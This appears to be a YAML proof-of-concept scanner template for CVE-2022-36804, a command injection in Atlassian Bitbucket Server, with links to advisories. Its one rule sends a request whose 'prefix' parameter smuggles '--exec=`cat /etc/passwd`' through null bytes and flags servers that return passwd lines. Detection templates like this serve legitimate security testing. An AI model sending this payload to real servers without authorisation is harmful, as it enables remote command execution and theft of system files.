name: yaml-poc-atlassian-bitbucket-other-CVE-2022-36804
binding: 5bb47e4b-c972-44e4-80f4-e064c98d4c85
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/168470/Bitbucket-Git-Command-Injection.html
        - http://packetstormsecurity.com/files/171453/Bitbucket-7.0.0-Remote-Command-Execution.html
        - https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html
        - https://cxsecurity.com/cveshow/CVE-2022-36804/
        - https://jira.atlassian.com/browse/BSERV-13438
        - https://packetstormsecurity.com/files/168470/Bitbucket-Git-Command-Injection.html
        - https://www.auscert.org.au/bulletins/ESB-2022.4198
    vulnerability:
        id: b01bcb6f-e321-45e1-8f3b-a8752a3d1f01
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /rest/api/latest/projects/BIZEE/repos/bizee-communication-api/archive?filename=wN3Am&at=wN3Am&path=wN3Am&prefix=ax%00--exec=%60cat%20/etc/passwd%60%00--remote=origin
            follow_redirects: true
        expression: response.status == 500 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
